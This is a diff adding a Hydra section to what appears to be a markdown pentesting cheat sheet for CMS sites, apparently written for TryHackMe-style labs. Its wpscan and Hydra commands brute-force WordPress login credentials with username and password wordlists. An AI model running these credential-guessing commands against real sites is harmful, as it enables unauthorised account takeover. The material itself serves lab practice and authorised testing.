@@ -17,7 +17,11 @@ wpscan --url URL -e vp,u,cb,dbe
 ```
 wpscan --url URL --wordlist DICTIONARYPATH --username USERNAME
 ```
+### Hydra
+```
+hydra -L USERLIST -P PASSLIST IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" 
 
+```
 ## Joomla
 ### Joomscan Scan
 ```
